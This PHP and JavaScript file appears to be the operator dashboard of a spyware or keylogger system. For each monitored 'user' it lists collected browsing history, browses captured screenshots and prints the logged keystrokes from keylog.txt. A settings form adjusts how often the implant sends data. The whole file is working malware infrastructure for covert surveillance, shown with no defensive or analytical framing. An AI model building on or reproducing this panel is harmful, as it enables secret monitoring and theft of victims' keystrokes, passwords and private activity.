<?php
	$users = array_slice(scandir("db/users"), 2);

	if(!isset($_GET["u"]) || !in_array($_GET["u"], $users)){
		exit("error");
		?>
		<a href = "index.php">go back</a>
		<?php
	}else{
		$u = $_GET["u"];
		?>
		<h1><?php echo $u;?></h1>
		<input type = "hidden" id = "iduser" value = "<?php echo $u;?>">
		<a href = "collected.php?u=<?php echo $u;?>&section=h">historial</a>
		<br>
		<br>
		<a href = "collected.php?u=<?php echo $u;?>&section=s">screenshots</a>
		<br>
		<br>
		<a href = "collected.php?u=<?php echo $u;?>&section=k">keylog</a>

		<h4>Configuraciones:</h4>
		<form method = "post" action = "setconfig.php">
			<?php
				require_once "db/users/".$u."/config.php";
			?>
			<p>Intervalos de segundos para peticion de data:</p>
			<input type = "value" 	name = "tictac" value = "<?php echo $__config__["tictac"] / 1000;?>">
			<input type = "hidden" 	name = "iduser" value = "<?php echo $u;?>">
			<input type = "submit">
		</form>

		<?php
		if(isset($_GET["section"])){
			?>
			<div style = "padding-left:2.5%;">
			<?php
			switch ($_GET["section"]) {
				case 'h':{
					echo "<h3>historial</h3><u>";
					require_once "db/users/".$u."/history.php";
					foreach ($__history__ as $key => $item) {
						echo "<li><a href = '".$item["url"]."' target = '_blank'>".$item["url"]."</a></li>";
					}
					echo "</u>";
				}break;
				case 's':{
					$screenshots = array_slice(scandir("db/users/".$u."/screenshots"), 2);
					echo "<h3>screenshots</h3><br><table><tr><td><div style = 'height:500px;overflow:scroll;'><u>";
					foreach ($screenshots as $key => $value){
						echo "<li><a href = 'javascript:;' class = 'link_image' data-pos = '".$key."'>".$value."</a></li>";
					}
					echo "</u></div></td><td valign = 'top' style = 'border: solid 1px;padding:5%;width:75%;'>";
					?>
					<div style = "width:100%;" align = "center">
						<button id = "past_sc"><<</button>
						<button id = "next_sc">>></button><br><br>
						<div id = "divimg">
						</div>
					</div>
					<?php
					echo "</td></tr></table>";
				}break;
				case 'k':{
					echo "<h3>keylog</h3>";
					echo file_get_contents("db/users/".$u."/keylog.txt");
				}break;
			}
			?>
			</div>
			<?php
		}
	}
?>
<script type="text/javascript">
	var t = document.getElementsByClassName("link_image");
	var n = t.length;
	for(var i = 0; i < n; i++){
		t[i].onclick = function(){
			(this.innerHTML + " " + this.getAttribute("data-pos"));
			divimg.innerHTML = "<a href = 'db/users/"+iduser+"/screenshots/"+this.innerHTML+"' target = '_blank'><img style = 'width:100%;' src = 'db/users/"+iduser+"/screenshots/"+this.innerHTML+"'></a>";
			t[ip].style.color = "black";
			ip = Number(this.getAttribute("data-pos"));
			t[ip].style.color = "red";
		}
	}
	var divimg = document.getElementById("divimg");
	var iduser = document.getElementById("iduser").value;
	divimg.innerHTML = "<a href = 'db/users/"+iduser+"/screenshots/"+t[0].innerHTML+"' target = '_blank'><img style = 'width:100%;' src = 'db/users/"+iduser+"/screenshots/"+t[0].innerHTML+"'></a>";
	t[0].style.color = "red";
	var previous = t[0];
	var ip = 0;
	document.getElementById("past_sc").onclick = function(){
		if(ip > 0){
			t[ip].style.color = "black";
			ip--;
			t[ip].style.color = "red";
			divimg.innerHTML = "<a href = 'db/users/"+iduser+"/screenshots/"+t[ip].innerHTML+"' target = '_blank'><img style = 'width:100%;' src = 'db/users/"+iduser+"/screenshots/"+t[ip].innerHTML+"'></a>";
		}
	}
	document.getElementById("next_sc").onclick = function(){
		if(ip < n){
			t[ip].style.color = "black";
			ip++;
			t[ip].style.color = "red";
			divimg.innerHTML = "<a href = 'db/users/"+iduser+"/screenshots/"+t[ip].innerHTML+"' target = '_blank'><img style = 'width:100%;' src = 'db/users/"+iduser+"/screenshots/"+t[ip].innerHTML+"'></a>";
		}
	}
</script>